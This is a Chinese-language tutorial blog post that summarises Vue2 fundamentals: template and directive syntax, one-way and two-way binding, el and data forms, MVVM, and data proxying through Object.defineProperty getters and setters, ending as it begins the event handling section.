<!DOCTYPE html><html lang="zh-cmn-Hans" prefix="og: http://ogp.me/ns#" class="han-init"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" /><title>Vue2的知识点概览 &mdash; reading writing | Lee</title><link rel="stylesheet" href="https://github.com/Leeark/assets/vendor/primer-css/css/primer.css"><link rel="stylesheet" href="https://github.com/Leeark/assets/css/components/collection.css"><link rel="stylesheet" href="https://github.com/Leeark/assets/css/components/repo-card.css"><link rel="stylesheet" href="https://github.com/Leeark/assets/css/sections/repo-list.css"><link rel="stylesheet" href="https://github.com/Leeark/assets/css/components/boxed-group.css"><link rel="stylesheet" href="https://github.com/Leeark/assets/css/globals/common.css"><link rel="stylesheet" href="https://github.com/Leeark/assets/css/globals/responsive.css"><link rel="stylesheet" href="https://github.com/Leeark/assets/css/posts/index.css"><link rel="stylesheet" href="https://github.com/Leeark/assets/vendor/octicons/octicons/octicons.css"><link rel="stylesheet" href="https://mazhuang.org/rouge-themes/dist/github.css"><link rel="canonical" href="https://github.com/Leeark/2022/09/04/vue-summary/"><link rel="alternate" type="application/atom+xml" title="reading writing | Lee" href="https://github.com/Leeark/feed.xml"><link rel="shortcut icon" href="https://github.com/Leeark/favicon.ico"><meta property="og:title" content="Vue2的知识点概览"><meta name="keywords" content="前端框架, Vue"><meta name="og:keywords" content="前端框架, Vue"><meta name="description" content="vue基础用法&amp;基础原理整理"><meta name="og:description" content="vue基础用法&amp;基础原理整理"><meta property="og:url" content="https://github.com/Leeark/2022/09/04/vue-summary/"><meta property="og:site_name" content="reading writing | Lee"><meta property="og:type" content="article"><meta property="og:locale" content="zh_CN" /><meta property="article:published_time" content="2022-09-04"> <script src="https://github.com/Leeark/assets/vendor/jquery/dist/jquery.min.js"></script> <script src="https://github.com/Leeark/assets/js/jquery-ui.js"></script> <script src="https://github.com/Leeark/assets/js/main.js"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-80669434-1"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-80669434-1'); </script></head><body class="" data-mz=""><header class="site-header"><div class="container"><h1><a href="https://github.com/Leeark/" title="reading writing | Lee"><span class="octicon octicon-mark-github"></span> reading writing | Lee</a></h1><button class="collapsed mobile-visible" type="button" onclick="toggleMenu();"> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </button><nav class="site-header-nav" role="navigation"> <a href="https://github.com/Leeark/" class=" site-header-nav-item" target="" title="首页">首页</a> <a href="https://github.com/Leeark/categories/" class=" site-header-nav-item" target="" title="分类">分类</a> <a href="https://github.com/Leeark/wiki/" class=" site-header-nav-item" target="" title="维基">维基</a> <a href="https://github.com/Leeark/links/" class=" site-header-nav-item" target="" title="链接">链接</a> <a href="https://github.com/Leeark/about/" class=" site-header-nav-item" target="" title="关于">关于</a></nav></div></header><section class="collection-head small geopattern" data-pattern-id="Vue2的知识点概览"><div class="container"><div class="columns"><div class="column three-fourths"><div class="collection-title"><h1 class="collection-header">Vue2的知识点概览</h1><div class="collection-info"> <span class="meta-info"> <span class="octicon octicon-calendar"></span> 2022/09/04 </span> <span class="meta-info"> <span class="octicon octicon-file-directory"></span> <a href="https://github.com/Leeark/categories/#summary" title="summary">summary</a> </span> <span class="meta-info"> <span class="octicon octicon-clock"></span> 共 73020 字，约 209 分钟 </span></div></div></div><div class="column one-fourth mobile-hidden"><div class="collection-title"></div></div></div></div></section><section class="container content"><div class="columns"><div class="column three-fourths" ><article class="article-content markdown-body"><h1 id="vue基础用法基础原理整理">vue基础用法&amp;基础原理整理</h1><h1 id="1-vue基础知识和原理">1. vue基础知识和原理</h1><h2 id="11-初识vue">1.1 初识Vue</h2><ul><li>想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象</li><li>demo容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法</li><li>demo容器里的代码被称为【Vue模板】</li><li>Vue实例和容器是一一对应的</li><li>真实开发中只有一个Vue实例，并且会配合着组件一起使用</li><li>{ {xxx} }是Vue的语法：插值表达式，{ {xxx} }可以读取到data中的所有属性</li><li>一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新(Vue实现的响应式)</li></ul><blockquote><p>初始示例代码</p></blockquote><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器 --&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"demo"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;h1&gt;</span>Hello，，<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span> <span class="na">type=</span><span class="s">"text/javascript"</span> <span class="nt">&gt;</span>
	<span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span> <span class="c1">//阻止 vue 在启动时生成生产提示。</span>

	<span class="c1">//创建Vue实例</span>
	<span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
		<span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#demo</span><span class="dl">'</span><span class="p">,</span> <span class="c1">//el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。</span>
		<span class="na">data</span><span class="p">:{</span> <span class="c1">//data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。</span>
			<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">hello,world</span><span class="dl">'</span><span class="p">,</span>
			<span class="na">address</span><span class="p">:</span><span class="dl">'</span><span class="s1">北京</span><span class="dl">'</span>
		<span class="p">}</span>
	<span class="p">});</span>

<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><h2 id="12-模板语法">1.2 模板语法</h2><p>Vue模板语法有2大类:</p><ul><li><p>插值语法：</p><p>功能：用于解析标签体内容</p><p>写法：，xxx是js表达式，且可以直接读取到data中的所有属性</p></li><li><p>指令语法:</p><p>功能：用于解析标签（包括：标签属性、标签体内容、绑定事件…..）</p><p>举例：v-bind:href=”xxx” 或 简写为 :href=”xxx”，xxx同样要写js表达式，且可以直接读取到data中的所有属性</p></li></ul><blockquote><p>代码</p></blockquote><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;h1&gt;</span>插值语法<span class="nt">&lt;/h1&gt;</span>
	<span class="nt">&lt;h3&gt;</span>你好，<span class="nt">&lt;/h3&gt;</span>
	<span class="nt">&lt;hr/&gt;</span>
	<span class="nt">&lt;h1&gt;</span>指令语法<span class="nt">&lt;/h1&gt;</span>
    <span class="c">&lt;!-- 这里是展示被Vue指令绑定的属性，引号内写的是js表达式 --&gt;</span>
	<span class="nt">&lt;a</span> <span class="na">:href=</span><span class="s">"school.url.toUpperCase()"</span> <span class="na">x=</span><span class="s">"hello"</span><span class="nt">&gt;</span>点我去学习1<span class="nt">&lt;/a&gt;</span>
	<span class="nt">&lt;a</span> <span class="na">:href=</span><span class="s">"school.url"</span> <span class="na">x=</span><span class="s">"hello"</span><span class="nt">&gt;</span>点我去学习2<span class="nt">&lt;/a&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
    <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
		<span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
		<span class="na">data</span><span class="p">:{</span>
			<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">jack</span><span class="dl">'</span><span class="p">,</span>
			<span class="na">school</span><span class="p">:{</span>
				<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">百度</span><span class="dl">'</span><span class="p">,</span>
				<span class="na">url</span><span class="p">:</span><span class="dl">'</span><span class="s1">http://www.baidu.com</span><span class="dl">'</span><span class="p">,</span>
			<span class="p">}</span>
        <span class="p">}</span>
	<span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><h2 id="13-数据绑定">1.3 数据绑定</h2><p>Vue中有2种数据绑定的方式：</p><ul><li><p>单向绑定(v-bind)：数据只能从data流向页面</p></li><li><p>双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data</p><blockquote><p>tips:</p><p>1.双向绑定一般都应用在表单类元素上（如：input、select等）</p><p>2.v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值</p></blockquote></li></ul><blockquote><p>代码</p></blockquote><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
	<span class="c">&lt;!-- 普通写法 单向数据绑定 --&gt;</span>
    单向数据绑定：<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">v-bind:value=</span><span class="s">"name"</span><span class="nt">&gt;&lt;br/&gt;</span>
    双向数据绑定：<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">v-model:value=</span><span class="s">"name"</span><span class="nt">&gt;&lt;br/&gt;</span>
    
    <span class="c">&lt;!-- 简写 v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值--&gt;</span>
    单向数据绑定：<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">:value=</span><span class="s">"name"</span><span class="nt">&gt;&lt;br/&gt;</span>
    双向数据绑定：<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">v-model=</span><span class="s">"name"</span><span class="nt">&gt;&lt;br/&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
    <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
		<span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
		<span class="na">data</span><span class="p">:{</span>
			<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">jack</span><span class="dl">'</span><span class="p">,</span>
        <span class="p">}</span>
	<span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><h2 id="14-el与data的两种写法">1.4 el与data的两种写法</h2><p>el有2种写法</p><ul><li><p>new Vue时候配置el属性</p></li><li><p>先创建Vue实例，随后再通过vm.$mount(‘#root’)指定el的值</p></li></ul><blockquote><p>代码</p></blockquote><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
   	<span class="c1">// 第一种 </span>
	<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
		<span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
		<span class="na">data</span><span class="p">:{</span>
			<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">jack</span><span class="dl">'</span><span class="p">,</span>
        <span class="p">}</span>
	<span class="p">})</span>
    
    <span class="c1">// 第二种</span>
    <span class="nx">vm</span><span class="p">.</span><span class="nx">$mount</span><span class="p">(</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">)</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p>data有2种写法</p><ul><li><p>对象式</p></li><li><p>函数式</p><blockquote><p>在组件中，data必须使用函数式</p></blockquote></li></ul><blockquote><p>代码</p></blockquote><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
    <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
		<span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="c1">// 第一种</span>
		<span class="na">data</span><span class="p">:{</span>
			<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">jack</span><span class="dl">'</span><span class="p">,</span>
        <span class="p">}</span>
        
        <span class="c1">// 第二种</span>
        <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
        	<span class="k">return</span> <span class="p">{</span>
                <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">jack</span><span class="dl">'</span>
            <span class="p">}</span>
    	<span class="p">}</span>
	<span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><h2 id="15-vue中的mvvm">1.5 Vue中的MVVM</h2><ul><li>M：模型(Model) ：data中的数据</li><li>V：视图(View) ：模板代码</li><li>VM：视图模型(ViewModel)：Vue实例</li></ul><h2 id="16-数据代理">1.6 数据代理</h2><blockquote><p>了解数据代理需要js的一些知识：Object.defineProperty()，属性标志，属性描述符，getter，setter。。。</p></blockquote><p>建议学习文章地址：</p><p>https://zh.javascript.info/property-descriptors</p><p>https://zh.javascript.info/property-accessors</p><p>这里简单介绍一下：</p><p><strong>属性标志</strong>:</p><p>对象属性（properties），除 <strong><code class="language-plaintext highlighter-rouge">value</code></strong> 外，还有三个特殊的特性（attributes），也就是所谓的“标志”</p><ul><li><strong><code class="language-plaintext highlighter-rouge">writable</code></strong> — 如果为 <code class="language-plaintext highlighter-rouge">true</code>，则值可以被修改，否则它是只可读的</li><li><strong><code class="language-plaintext highlighter-rouge">enumerable</code></strong> — 如果为 <code class="language-plaintext highlighter-rouge">true</code>，则表示是可以遍历的，可以在for.. .in Object.keys()中遍历出来</li><li><strong><code class="language-plaintext highlighter-rouge">configurable</code></strong> — 如果为 <code class="language-plaintext highlighter-rouge">true</code>，则此属性可以被删除，这些特性也可以被修改，否则不可以</li></ul><p><strong>Object.getOwnPropertyDescriptor(obj, propertyName)</strong></p><blockquote><p>这个方法是查询有关属性的完整信息 obj是对象， propertyName是属性名</p></blockquote><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">user</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">John</span><span class="dl">"</span>
<span class="p">};</span>

<span class="kd">let</span> <span class="nx">descriptor</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">getOwnPropertyDescriptor</span><span class="p">(</span><span class="nx">user</span><span class="p">,</span> <span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">);</span>


<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">descriptor</span><span class="p">)</span>

<span class="cm">/* 属性描述符：
{
  "value": "John",
  "writable": true,
  "enumerable": true,
  "configurable": true
}
*/</span>
</code></pre></div></div><blockquote><p>打印结果</p></blockquote><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220321123253628.png" alt="image-20220321123253628" /></p><p><strong>Object.defineProperty</strong>(obj, prop, descriptor)</p><blockquote><p>obj：要定义属性的对象。</p><p>prop：要定义或修改的属性的名称</p><p>descriptor：要定义或修改的属性描述符</p></blockquote><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">user</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">John</span><span class="dl">"</span>
<span class="p">};</span>

<span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">user</span><span class="p">,</span> <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
  <span class="na">writable</span><span class="p">:</span> <span class="kc">false</span>
<span class="p">});</span>

<span class="nx">user</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Pete</span><span class="dl">"</span><span class="p">;</span>

<span class="c1">// 打印后还是显示 'John',无法修改name值</span>
</code></pre></div></div><p>其他的属性标志就不演示了，接下来看重点：访问器属性。</p><p><strong>访问器属性：</strong></p><p>本质上是用于获取和设置值的函数，但从外部代码来看就像常规属性。</p><p>访问器属性由 “getter” 和 “setter” 方法表示。在对象字面量中，它们用 <code class="language-plaintext highlighter-rouge">get</code> 和 <code class="language-plaintext highlighter-rouge">set</code> 表示：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span>
    <span class="kd">get</span> <span class="nx">name</span><span class="p">()</span> <span class="p">{</span>
        <span class="c1">// 当读取 obj.propName 时，getter 起作用</span>
    <span class="p">},</span>
    <span class="kd">set</span> <span class="nx">name</span><span class="p">()</span> <span class="p">{</span>
        <span class="c1">// 当执行 obj.name = value 操作时，setter 起作用</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div><p><strong>更复杂一点的使用</strong></p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">user</span> <span class="o">=</span> <span class="p">{</span>
	<span class="na">surname</span><span class="p">:</span> <span class="dl">'</span><span class="s1">gao</span><span class="dl">'</span><span class="p">,</span>
    <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">han</span><span class="dl">'</span>
    
    <span class="kd">get</span> <span class="nx">fullName</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">name</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">surname</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">fullName</span><span class="p">)</span>
</code></pre></div></div><p>从外表看，访问器属性看起来就像一个普通属性。这就是访问器属性的设计思想。我们不以函数的方式 <strong>调用</strong> <code class="language-plaintext highlighter-rouge">user.fullName</code>，我们正常 <strong>读取</strong> 它：getter 在幕后运行。</p><blockquote><p>vue的计算属性的底层构造感觉用到了这种思想，我目前还没看过源码，是这样猜想的。</p></blockquote><p>截至目前，<code class="language-plaintext highlighter-rouge">fullName</code> 只有一个 getter。如果我们尝试赋值操作 <code class="language-plaintext highlighter-rouge">user.fullName=</code>，将会出现错误：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">user</span><span class="p">.</span><span class="nx">fullName</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Test</span><span class="dl">"</span><span class="p">;</span> <span class="c1">// Error（属性只有一个 getter）</span>
</code></pre></div></div><p>为 <code class="language-plaintext highlighter-rouge">user.fullName</code> 添加一个 setter 来修复它：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">user</span> <span class="o">=</span> <span class="p">{</span>
	<span class="na">surname</span><span class="p">:</span> <span class="dl">'</span><span class="s1">gao</span><span class="dl">'</span><span class="p">,</span>
    <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">han</span><span class="dl">'</span>
    
    <span class="kd">get</span> <span class="nx">fullName</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">name</span> <span class="o">+</span> <span class="dl">'</span><span class="s1"> </span><span class="dl">'</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">surname</span><span class="p">;</span>
    <span class="p">}</span>

	<span class="kd">set</span> <span class="nx">fullName</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// 这个用到了新语法 结构赋值</span>
        <span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">surname</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="dl">'</span><span class="s1"> </span><span class="dl">'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">user</span><span class="p">.</span><span class="nx">fullName</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">Li Hua</span><span class="dl">'</span>

<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">surname</span><span class="p">);</span>
</code></pre></div></div><p><strong>终于可以介绍数据代理了</strong>：</p><p>数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）</p><p>先来看个案例：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span>
    <span class="na">x</span><span class="p">:</span> <span class="mi">100</span>
<span class="p">}</span>

<span class="kd">let</span> <span class="nx">obj2</span> <span class="o">=</span> <span class="p">{</span>
    <span class="na">y</span><span class="p">:</span> <span class="mi">200</span>
<span class="p">}</span>
</code></pre></div></div><p>这时候提一个需求：我们想要访问 <strong>obj</strong> 中的 <strong>x</strong> 的值，但我们最好不要直接去访问 <strong>obj</strong> ,而是想要通过 <strong>obj2</strong> 这个代理对象去访问。</p><p>这时候就可以用上 <strong>Object.defineProperty()</strong>，给 <strong>obj2</strong> 添加上访问器属性（也就是getter和setter）</p><blockquote><p>代码</p></blockquote><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span>
    <span class="na">x</span><span class="p">:</span> <span class="mi">100</span>
<span class="p">}</span>

<span class="kd">let</span> <span class="nx">obj2</span> <span class="o">=</span> <span class="p">{</span>
    <span class="na">y</span><span class="p">:</span> <span class="mi">200</span>
<span class="p">}</span>

<span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">obj2</span><span class="p">,</span> <span class="dl">'</span><span class="s1">x</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
    <span class="kd">get</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">x</span><span class="p">;</span>
    <span class="p">},</span>
    <span class="kd">set</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">obj</span><span class="p">.</span><span class="nx">x</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">})</span>
</code></pre></div></div><blockquote><p>这就是数据代理，也不难吧</p></blockquote><p><strong>接下来介绍Vue中的数据代理</strong></p><ul><li>Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读/写）</li><li>Vue中数据代理的好处：更加方便的操作data中的数据</li><li>基本原理：<ul><li>通过Object.defineProperty()把data对象中所有属性添加到vm上。</li><li>为每一个添加到vm上的属性，都指定一个getter/setter。</li><li>在getter/setter内部去操作（读/写）data中对应的属性。</li></ul></li></ul><p>我来用一个案例来详细解释这一个过程。</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;h2&gt;</span>学校名称：<span class="nt">&lt;/h2&gt;</span>
	<span class="nt">&lt;h2&gt;</span>学校地址：<span class="nt">&lt;/h2&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span> <span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:</span> <span class="p">{</span>
            <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">浙江师范大学</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">address</span><span class="p">:</span> <span class="dl">'</span><span class="s1">浙江金华</span><span class="dl">'</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p>我们在控制台打印 new 出来的 vm</p><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220321131408332.png" alt="image-20220321131408332" /></p><p>可以看到，写在配置项中的 data 数据被 绑定到了 vm 对象上，我先来讲结果，是 Vue 将 _data 中的 name，address 数据 代理到 vm 本身上。</p><blockquote><p>一脸懵逼？</p></blockquote><p>先来解释下_data 是啥， _data 就是 vm 身上的 _data 属性，就是下图那个</p><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220321132114627.png" alt="image-20220321132114627" /></p><p>这个 _data 是从哪来的？</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
    
	<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span> <span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="c1">// 我们在Vue 初始化的配置项中写了 data 属性。</span>
        <span class="na">data</span><span class="p">:</span> <span class="p">{</span>
            <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">浙江师范大学</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">address</span><span class="p">:</span> <span class="dl">'</span><span class="s1">浙江金华</span><span class="dl">'</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p>new Vue 时， Vue 通过一系列处理， 将匹配项上的 data 数据绑定到了 _data 这个属性上，并对这个属性进行了处理（数据劫持），但这个属性就是来源于配置项中的 data，我们可以来验证一下。</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
    
    <span class="kd">let</span> <span class="nx">data1</span> <span class="o">=</span> <span class="p">{</span>
        <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">浙江师范大学</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">address</span><span class="p">:</span> <span class="dl">'</span><span class="s1">浙江金华</span><span class="dl">'</span>
    <span class="p">}</span>
    
	<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span> <span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="c1">// 我们在Vue 初始化的配置项中写了 data 属性。</span>
        <span class="na">data</span><span class="p">:</span> <span class="nx">data1</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220321133021821.png" alt="image-20220321133021821" /></p><blockquote><p>打印结果为true，说明两者就是同一个</p></blockquote><p>好了，再回到数据代理上来，将 <strong>vm._data</strong> 中的值，再代理到 vm 本身上来，用vm.name 代替 <strong>vm._data.name</strong>。这就是 Vue 的数据代理</p><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220321133412103.png" alt="image-20220321133412103" /></p><p>这一切都是通过 Object.defineProperty() 来完成的，我来模拟一下这个过程</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">vm</span><span class="p">,</span> <span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
    <span class="kd">get</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">_data</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>
    <span class="p">},</span>
    <span class="kd">set</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nx">_data</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="nx">value</span>
    <span class="p">}</span>
<span class="p">})</span>
</code></pre></div></div><blockquote><p>这样有啥意义？明明通过 vm._data.name 也可以访问 name 的值，为啥费力去这样操作？</p></blockquote><p>在插值语法中， 取到的值就相当于 ，不用数据代理的话，在插值语法就要这样去写了。</p><p>这不符合直觉，怪怪的。vue 这样设计更利于开发者开发，我们在研究原理会觉得有些复杂（笑~）</p><p>来个尚硅谷张天禹老师做的图（非常推荐去看他的课，讲的非常好）</p><p><img src="C:\Users\28318\Desktop\vue\vue_basic\06_数据代理\数据代理图示.png" alt="数据代理图示" /></p><h2 id="17-事件处理">1.7 事件处理</h2><p>事件的基本使用：</p><ul><li>使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名</li><li>事件的回调需要配置在methods对象中，最终会在vm上</li><li>methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象</li></ul><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
